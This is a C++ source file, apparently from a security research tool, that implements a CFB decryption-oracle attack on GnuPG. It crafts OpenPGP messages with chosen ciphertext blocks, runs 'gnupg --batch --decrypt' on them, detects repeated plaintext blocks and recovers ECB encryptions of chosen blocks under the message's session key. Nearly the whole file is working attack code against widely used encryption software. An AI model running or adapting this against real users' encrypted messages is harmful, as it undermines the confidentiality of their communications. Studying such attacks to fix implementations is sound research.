

#include "sed-oracle.h"
#include "sedp.h"
#include "except.h"
#include "file_util.h"
#include "subprocess.hpp"
#include <memory>
#include <optional>
#include <botan/auto_rng.h>
#include <iostream>
#include "util.h"
#include "opgp_cfb_decr_fun_simulation.h"
#include "detect_pattern.h"
#include "except.h"
#include "query_cfb_ct.h"
#include "cipher_block.h"

// Note: boost.process seems badly maintained: https://github.com/bitcoin/bitcoin/issues/24907
//
namespace sp = subprocess;

namespace
{

// TODO: REPLACE THIS WITH THE MORE GENERAL FUNCTION count_blocks_in_repeatet_pattern_area() IN detect_pattern.cpp
/**
 * @brief Determine the number of repeated blocks starting at the offset within cfb_plaintext.
 *
 * @param cfb_plaintext The CFB plaintext.
 * @param offset The offset into the CFB plaintext at which the block repetition starts.
 *
 * @return the number of repeated blocks starting at offset.
 */
uint32_t determine_number_of_repeated_blocks(std::span<const uint8_t> cfb_plaintext, uint32_t offset)
{
    unsigned block_size = 16;
    if (offset + 2 * block_size > cfb_plaintext.size())
    {
        throw Exception("cfb_plaintext too small");
    }
    std::span<const uint8_t> sought_block(cfb_plaintext.begin() + offset, cfb_plaintext.begin() + offset + block_size);
    uint32_t cnt = 0;
    for (uint32_t i = offset + block_size; i + block_size < cfb_plaintext.size(); i += block_size)
    {
        std::span<const uint8_t> match_block(cfb_plaintext.begin() + i, cfb_plaintext.begin() + i + block_size);
        if (!std::equal(sought_block.begin(), sought_block.end(), match_block.begin(), match_block.end()))
        {
            break;
        }
        cnt++;
    }
    return cnt;
}

/**
 * @brief Computes the ECB decryption result for a certain guess for the offset of the CFB decryption result returned by
 * the oracle into the CFB ciphertext.
 *
 * @param cfb_decryption_result The CFB decrypted ciphertext returned by the oracle.
 * @param second_step_ct The second-stop CFB ciphertext that was input into the decryption oracle.
 * @param offset_in_ct The guess for the offset that the start of the CFB decryption result has into the second-step CFB
 * ciphertext.
 *
 * @return The ECB encryption of the blocks that were CFB-decrypted
 */
std::vector<uint8_t> recover_ecb_encrypted_blocks_from_cfb_decryption_for_offset(
    std::span<uint8_t> cfb_decryption_result, std::span<const uint8_t> second_step_ct, uint32_t offset_in_ct)
{
    const unsigned block_size = 16;
    std::vector<uint8_t> ecb_encrypted_blocks;
    uint32_t offset_in_block  = offset_in_ct % block_size;
    uint32_t next_block_index = ((offset_in_ct + block_size) / block_size) - 1;
    uint32_t next_block_begin = offset_in_ct + (block_size - offset_in_block);
    // XOR the whole available decryption result starting from the start of the next block with ciphertext to recover
    // the ECB encrypted blocks.
    for (uint32_t i = next_block_begin; i < cfb_decryption_result.size(); i++)
    {
        // i runs through all the positions in the decryption result
        uint32_t this_ct_offset = offset_in_ct + i;
        if (this_ct_offset > second_step_ct.size())
        {
            std::cerr
                << "breaking because XOR of plaintext and ciphertext because ciphertext length is exhausted already"
                << std::endl;
            break;
        }
        ecb_encrypted_blocks.push_back(second_step_ct[this_ct_offset] ^ cfb_decryption_result[i]);
    }
    return ecb_encrypted_blocks;
}

#if 0
/**
 * @brief process a candidate for the ECB decryption result starting at a block boundary. Try to find a repeated pattern
 * of blocks of the specified length.
 *
 * @param ecb_blocks the candidate sequence starting at a block boundary.
 * @param pattern_length_in_blocks the number of blocks the sought repeated pattern is comprised of.
 *
 * @return the the found pattern that was repeated. returns an empty vector if no repetition. In case of a detected
 * repetition, the result may be shorter than the specified pattern length if there was insufficient remaining data, but
 * then has at least lenght of one block.
 */
std::vector<uint8_t> determine_repeated_pattern_of_blocks(std::span<const uint8_t> ecb_blocks,
                                                          uint32_t pattern_length_in_blocks)
{
    const unsigned block_size        = 16;
    uint32_t pattern_length_in_bytes = pattern_length_in_blocks * block_size;
    bool found_pattern_repetition    = false;
    for (uint32_t i = 0; i < ecb_blocks.size(); i += block_size)
    {
        if (ecb_blocks.size() - i < (block_size + 1) * pattern_length_in_blocks)
        {
            // don't process if there can't be at least a single complete pattern and at least the first block of the
            // first repetition
            break;
        }
        // presume the start of the pattern is at this block
        std::span<const uint8_t> candidate(ecb_blocks.begin() + i, ecb_blocks.begin() + i + pattern_length_in_bytes);
        uint32_t rem_len_in_ecb_blocks = ecb_blocks.size() - i;
        uint32_t compare_len           = std::min(pattern_length_in_bytes, rem_len_in_ecb_blocks);
        auto end_of_first_pattern      = ecb_blocks.begin() + i + compare_len;
        auto start_of_compare_region   = ecb_blocks.begin() + i + pattern_length_in_bytes;
        if (std::equal(ecb_blocks.begin() + i, end_of_first_pattern, start_of_compare_region))
        {
            return std::vector<uint8_t>(start_of_compare_region, start_of_compare_region + compare_len);
        }
    }
    return std::vector<uint8_t>();
}

#endif


/**
 * @brief determine the correct ECB oracle block for a single block repetition pattern
 *
 * @param cfb_decryption_result The decryption result returned by the CFB oracle.
 * @param offset_of_rep_in_decr_res The offset at which a block repetition sequence starts within the CFB decryption
 * result.
 * @param query_ct the oracle blocks set in the the ciphertext, i.e. the repeated sequence of blocks responsible
 * for the repetition pattern the plaintext.
 *
 * @return The ECB encrypted oracle block. An empty vector is returned if the recovery failed.
 */
std::optional<cipher_block_t<AES_BLOCK_SIZE>> recover_ecb_encryption_for_single_block_rep_pattern(
    std::span<const uint8_t> cfb_decryption_result,
    uint32_t offset_of_rep_in_decr_res,
    query_cfb_ct_t const& query_ct,
    std::span<const uint8_t> session_key)
{
    // determine the repeated count
    uint32_t nb_rep_blocks = determine_number_of_repeated_blocks(cfb_decryption_result, offset_of_rep_in_decr_res);
    // use only if at least 3 blocks. then recover the 2nd and the 3rd block and check if they are equal
    if (nb_rep_blocks < 2)
    {
        return std::optional<cipher_block_t<AES_BLOCK_SIZE>>();
    }

    //uint32_t offset_of_first_oracle_block_in_ct = query_ct.offset_of_first_oracle_block();
    cipher_block_vec_t<AES_BLOCK_SIZE> rep_pt_blocks(
        std::span(cfb_decryption_result.begin() + offset_of_rep_in_decr_res,
                  cfb_decryption_result.begin() + offset_of_rep_in_decr_res + 2 * AES_BLOCK_SIZE));


    cipher_block_vec_t<AES_BLOCK_SIZE> ct_oracle_blocks = query_ct.oracle_blocks_single_pattern();
    if (ct_oracle_blocks.size() != 1)
    {
        throw Exception("case of oracle pattern block count != 1 not implemented");
    }
    cipher_block_t ecb_encrypted_0 = rep_pt_blocks[0] ^ ct_oracle_blocks[0];
    cipher_block_t ecb_encrypted_1 =
        rep_pt_blocks[1] ^ ct_oracle_blocks[0]; // necessarily the same calculation as above

    if (ecb_encrypted_0 != ecb_encrypted_1)
    {
        std::cerr << std::format("rep_pt_blocks[0] = {}\n", rep_pt_blocks[0].hex());
        std::cerr << std::format("rep_pt_blocks[1] = {}\n", rep_pt_blocks[1].hex());
        std::cerr << std::format("ecb_encrypted[0] = {}\n", ecb_encrypted_0.hex());
        std::cerr << std::format("ecb_encrypted[1] = {}\n", ecb_encrypted_1.hex());
        std::cerr << std::format("ct_oracle_blocks[0] = {}\n", ct_oracle_blocks[0].hex());

        std::cerr << "error with recovered ECB encryption for repeated blocks\n";
    }

    if (session_key.size() > 0)
    {
        auto actual_ecb_encrypted = ecb_encrypt_block(std::span(session_key), ct_oracle_blocks[0]);
        if (actual_ecb_encrypted != ecb_encrypted_0)
        {
            std::cerr << "  verification of ECB block encryption with actual session key failed\n";
        }
        else
        {
            std::cout << "  verification of ECB block encryption with actual session key succeeded\n";
        }
    }

    return ecb_encrypted_0;
}
} // namespace

std::vector<uint8_t> invoke_cfb_opgp_decr(openpgp_app_decr_params_t const& decr_params)
{
    using enum openpgp_app_e;
    if (decr_params.app_type != gnupg)
    {
        throw cli_exception_t("cfb_opgp_decr_oracle(): only GnuPG is currently supported as an oracle");
    }
    std::string app_path = decr_params.application_path;
    if (app_path.size() == 0)
    {
        app_path = "gnupg";
    }
    std::unique_ptr<sp::Popen> p;
    std::vector<char> to_stdin;

    if (std::holds_alternative<std::string>(decr_params.ct_filename_or_data))
    {
        // std::cout << "creating process with file-based decryption..." << std::endl;
        p = std::unique_ptr<sp::Popen>(
            new sp::Popen({app_path, "--batch", "--decrypt", std::get<std::string>(decr_params.ct_filename_or_data)},
                          sp::output {sp::PIPE},
                          sp::error {sp::PIPE},
                          sp::defer_spawn {true}));
    }
    else if (std::holds_alternative<std::vector<uint8_t>>(decr_params.ct_filename_or_data))
    {
        //        throw Exception("stdin input to appication not available");
        p            = std::unique_ptr<sp::Popen>(new sp::Popen({decr_params.application_path, "--batch", "--decrypt"},
                                                     sp::output {sp::PIPE},
                                                     sp::error {sp::PIPE},
                                                     sp::defer_spawn {true}));
        auto ct_data = std::get<std::vector<uint8_t>>(decr_params.ct_filename_or_data);
        for (size_t i = 0; i < ct_data.size(); i++)
        {
            to_stdin.push_back(static_cast<char>(ct_data[i]));
        }
    }
    else
    {
        throw Exception("internal error: neither file nor data supplied for ciphertext");
    }


    // auto stdout_stderr = p->communicate(to_stdin);
    p->start_process();
    p->send(to_stdin);
    int poll       = p->poll();
    uint32_t count = 0;
    while (poll == -1)
    {
        std::this_thread::sleep_for(std::chrono::milliseconds(1));
        poll = p->poll();
        if (count++ > 1000)
        {
            break;
        }
    }
    // std::cout << std::format("poll = {}\n", poll);
    if (poll == -1)
    {
        std::cout << "killing process ...\n";
        p->kill();
        return std::vector<uint8_t>();
    }
    // std::cout << "calling communicate ... ";
    auto stdout_stderr = p->communicate();
    // std::cout << "... finished\n";
    auto obuf   = stdout_stderr.first;
    std::cout << std::format("invoke_cfb_opgp_decr(openpgp_app_decr_params_t const& decr_params): obuf.size() = {}\n", obuf.buf.size());
    auto errbuf = stdout_stderr.second;
    std::cout << std::format("invoke_cfb_opgp_decr(openpgp_app_decr_params_t const& decr_params): errbuf.size() = {}\n", errbuf.buf.size());
#if 0
    if (obuf.length)
    {

        p = std::unique_ptr<sp::Popen>(new sp::Popen(
            {decr_params.application_path, "--list--packets", std::get<std::string>(decr_params.ct_filename_or_data)},
            sp::output {sp::PIPE},
            sp::error {sp::PIPE}));
        std::cout << "stdout: " << obuf.buf.data() << std::endl;
        std::cerr << "stderr: " << errbuf.buf.data() << std::endl;
    }
#endif
    /*std::cout << "stdout: " << obuf.buf.data() << std::endl;
    std::cout << "stdout len: " << obuf.length << std::endl;
    std::cerr << "stderr: " << errbuf.buf.data() << std::endl;
    std::cerr << "stderr len: " << errbuf.length << std::endl;*/
    std::vector<uint8_t> result;
    result.insert(result.begin(), obuf.buf.data(), obuf.buf.data() + obuf.length);
    std::cout << std::format("invoke_cfb_opgp_decr(openpgp_app_decr_params_t const& decr_params): returning result of length {}\n", result.size());
    return result;
}

cipher_block_vec_t<AES_BLOCK_SIZE> invoke_ecb_opgp_decr(
    vector_cfb_ciphertext_t const& vec_ct,
    cipher_block_vec_t<AES_BLOCK_SIZE> const& oracle_ciphertext_blocks,
    std::span<const uint8_t> pkesk,
    openpgp_app_decr_params_t const& decr_params,
    std::span<const uint8_t> session_key 
    )
{
    auto actual_ciphertext = oracle_ciphertext_blocks;
    // append a trailing zero block because otherwise the final oracle block will not be recoverable from the CFB
    // decryption result:
    actual_ciphertext.push_back(cipher_block_t<AES_BLOCK_SIZE>());

    std::vector<uint8_t> cfb_decr =
        invoke_cfb_opgp_decr_yield_oracle_blocks(vec_ct, actual_ciphertext, pkesk, decr_params);
    std::cout << std::format("raw CFB decryption result = {}\n", cfb_decr.size());
    {
        size_t over_len = cfb_decr.size() % AES_BLOCK_SIZE;
        if (over_len)
        {
            std::cout << std::format("deleting {} trailing bytes from CFB decryption result\n", over_len);
            cfb_decr.erase(cfb_decr.end() - static_cast<int>(over_len), cfb_decr.end());
            std::cout << std::format("  ... remaining decryption CFB result length is {}\n", cfb_decr.size());
        }
    }
    cipher_block_vec_t<AES_BLOCK_SIZE> oracle_blocks_cfb(cfb_decr);
    // we assume that the start of the repeated region determined in the first query is at the start of the oracle
    // ciphertext. This information is crucial for the computation of the ECB decryption result.
    if (oracle_blocks_cfb.size() < oracle_ciphertext_blocks.size() + 1)
    {
        throw Exception("CFB decryption result returned by oracle is too short to recover the oracle blocks");
    }
    cipher_block_vec_t<AES_BLOCK_SIZE> ecb_blocks;
    {
        size_t cnt = 1;
        for (auto const& cfb_block : oracle_blocks_cfb)
        {
            ecb_blocks.push_back(cfb_block ^ oracle_ciphertext_blocks[cnt++]);
        }
    }

    if (session_key.size() > 0)
    {
        auto real_ecb_blocks  = ecb_encrypt_blocks(session_key, oracle_ciphertext_blocks);
        if(real_ecb_blocks != ecb_blocks)
        {
            std::cerr << std::format("error during ECB decryption attempt\n"
                                     "actual ecb encrypted =  {}\n"
                                     "encrypted from oracle = {}\n", real_ecb_blocks.hex(), ecb_blocks.hex());
            //throw Exception("actual encrypted and 
        }
    }
    return ecb_blocks;
}

std::vector<uint8_t> invoke_cfb_opgp_decr_yield_oracle_blocks(
    vector_cfb_ciphertext_t const& vec_ct,
    cipher_block_vec_t<AES_BLOCK_SIZE> const& oracle_ciphertext_blocks,
    std::span<const uint8_t> pkesk,
    openpgp_app_decr_params_t const& decr_params)
{

    if (vec_ct.nb_oracle_blocks < oracle_ciphertext_blocks.size())
    {
        throw Exception("vector ciphertext's oracle block capacity is too small for the payload");
    }
    // build PKESK || SED 
    // where SED = leading_blocks || oracle_blocks
    std::vector<uint8_t> full_ciphertext(pkesk.begin(), pkesk.end());
    auto leading_bytes = vec_ct.leading_blocks.serialize();
    full_ciphertext.insert(full_ciphertext.end(), leading_bytes.begin(), leading_bytes.end());
    std::vector<uint8_t> oracle_part = oracle_ciphertext_blocks.serialize();
    full_ciphertext.insert(full_ciphertext.end(), oracle_part.begin(), oracle_part.end());

    auto decryption_result = invoke_cfb_opgp_decr(full_ciphertext, decr_params);
    if(decryption_result.size() < vec_ct.decryption_result_offset)
    {
        throw Exception(std::format("invoke_cfb_opgp_decr_yield_oracle_blocks(): the raw CFB decryption result is shorter (namely {} bytes) than the offset expected according to the information in the vector ciphertext (namely {})", decryption_result.size(), vec_ct.decryption_result_offset));
    }
    decryption_result.erase(decryption_result.begin(), decryption_result.begin() + vec_ct.decryption_result_offset);
    std::cout << std::format("invoke_cfb_opgp_decr_yield_oracle_blocks(): returning result of length {}\n", decryption_result.size());
    return decryption_result;
}

std::vector<uint8_t> invoke_cfb_opgp_decr(std::span<const uint8_t> oracle_ciphertext,
                                          openpgp_app_decr_params_t const& decr_params)
{

    if(!std::holds_alternative<std::string>(decr_params.ct_filename_or_data))
    {
        throw Exception(std::format("expecting app_param to hold file name, index = {}\n", decr_params.ct_filename_or_data.index()));
    }
    write_binary_file(std::span(oracle_ciphertext), std::get<std::string>(decr_params.ct_filename_or_data));
    auto result = invoke_cfb_opgp_decr(decr_params);
    return result; 
}

cfb_decr_oracle_result_t cfb_opgp_decr_oracle_inital_query(run_time_ctrl_t rtc,
                                                           uint32_t iter,
                                                           openpgp_app_decr_params_t const& decr_params,
                                                           size_t nb_leading_random_bytes,
                                                           std::span<const uint8_t> pkesk,
                                                           std::span<const uint8_t> oracle_blocks_single_pattern,
                                                           uint32_t oracle_pattern_repetitions,
                                                           std::filesystem::path const& msg_file_path,
                                                           std::span<const uint8_t> session_key)
{
    //const unsigned block_size = 16;
    if (!std::holds_alternative<std::monostate>(decr_params.ct_filename_or_data))
    {
        throw Exception("ciphertext or filename specified in decryption parameters, this may not be done here");
    }
    lenght_is_multiple_of_aes_block_size_or_throw(oracle_blocks_single_pattern);
    //size_t nb_oracle_blocks = oracle_blocks_single_pattern.size() / block_size;
#if 0
    size_t nb_leading_random_blocks           = (nb_leading_random_bytes + block_size - 1) / block_size;
    size_t nb_leading_random_bytes_rounded_up = nb_leading_random_blocks * block_size;
    std::vector<uint8_t> first_step_ct(block_size + 2); // the 18 first zero bytes form the 1st-step ciphertext
    std::vector<uint8_t> second_step_ct(nb_leading_random_bytes_rounded_up);
    Botan::AutoSeeded_RNG rng;
    rng.randomize(std::span(second_step_ct.begin(), second_step_ct.end()));
    second_step_ct.insert(second_step_ct.end(), oracle_blocks.begin(), oracle_blocks.end());
    auto ciphertext = first_step_ct;
    std::copy(second_step_ct.begin(), second_step_ct.end(), std::back_inserter(ciphertext));
#endif
    query_cfb_ct_t query_ct = query_cfb_ct_t::create_from_oracle_blocks(
        cipher_block::uint8_span_to_cb_vec<AES_BLOCK_SIZE>(std::span(oracle_blocks_single_pattern)),
        oracle_pattern_repetitions,
        static_cast<uint32_t>(nb_leading_random_bytes));
    symm_encr_data_packet_t sed = symm_encr_data_packet_t::create_sedp_from_ciphertext(query_ct.serialize());
    auto encoded_sed            = sed.get_encoded();
    std::vector<uint8_t> pgp_msg;
    pgp_msg.assign(pkesk.begin(), pkesk.end());
    pgp_msg.insert(pgp_msg.end(), encoded_sed.begin(), encoded_sed.end());
    write_binary_file(std::span(pgp_msg), msg_file_path);
    auto decr_params_copy(decr_params);
    decr_params_copy.ct_filename_or_data = msg_file_path;
    auto decryption_result               = invoke_cfb_opgp_decr(decr_params_copy);

    if (iter == 0)
    {
        rtc.potentially_write_run_time_file(pgp_msg,
                                            std::format("sample_random_decryption_input-{}-no-positive", iter));
    }

    cipher_block_vec_t<AES_BLOCK_SIZE> recovered_blocks;
    uint32_t recovered_offset_into_decryption_result = 0;
    uint32_t recovered_pattern_block_length          = 0;
    if (decryption_result.size() >= 2 * AES_BLOCK_SIZE)
    {
        // check for block repetition pattern in CFB plaintext
        if (detect_pattern::rep_dect_result_t rep_patt = detect_pattern::has_byte_string_repeated_block_at_any_offset(
                decryption_result, query_ct.oracle_single_pattern_block_count()))
        {
            recovered_offset_into_decryption_result = rep_patt.offset();
            recovered_pattern_block_length          = rep_patt.nb_repeated_blocks();
            std::cout << std::format("iteration {}\n", iter);
            std::cout << std::format("  repeated pattern first occurrence at {}\n", rep_patt.offset());
            rtc.potentially_write_run_time_file(pgp_msg, std::format("random_decryption_input-{}", iter));
            // std::cout << "size of session key = " << session_key.size() << std::endl;
            if (session_key.size() > 0)
            {
                auto plaintext =
                    openpgp_cfb_decryption_sim(query_ct.serialize(), std::make_optional(std::span(session_key)));
                rtc.potentially_write_run_time_file(std::span(plaintext),
                                                    std::format("random_decryption_plaintext-{}", iter));
            }
            rtc.potentially_write_run_time_file(decryption_result, std::format("random_decryption_result-{}", iter));


            if (oracle_blocks_single_pattern.size() == AES_BLOCK_SIZE)
            {
                std::optional<cipher_block_t<AES_BLOCK_SIZE>> recov_ecb_encr =
                    recover_ecb_encryption_for_single_block_rep_pattern(
                        decryption_result, rep_patt.offset(), query_ct, session_key);
                if (recov_ecb_encr.has_value())
                {
                    std::cout << std::format("  recovered ECB encryption candidate for oracle block {}\n",
                                             Botan::hex_encode(recov_ecb_encr->data(), recov_ecb_encr->size()));
                    recovered_blocks.push_back(recov_ecb_encr.value());
                }
                else
                {
                    std::cout << "  ECB block encryption recovery failed\n";
                }

                
            }
        }
    }
    vector_cfb_ciphertext_t vector_ciphertext({.leading_blocks           = query_ct.leading_blocks(),
                                               .nb_oracle_blocks         = recovered_pattern_block_length,
                                               .decryption_result_offset = recovered_offset_into_decryption_result});
    if (vector_ciphertext.nb_oracle_blocks > 0)
    {
        std::cout << "  determined vector ciphertext: " << vector_ciphertext.to_string_brief() << std::endl;
    }

    return cfb_decr_oracle_result_t({.decryption_result          = decryption_result,
                                     .recovered_encrypted_blocks = recovered_blocks,
                                     .vector_ciphertext          = vector_ciphertext});
}
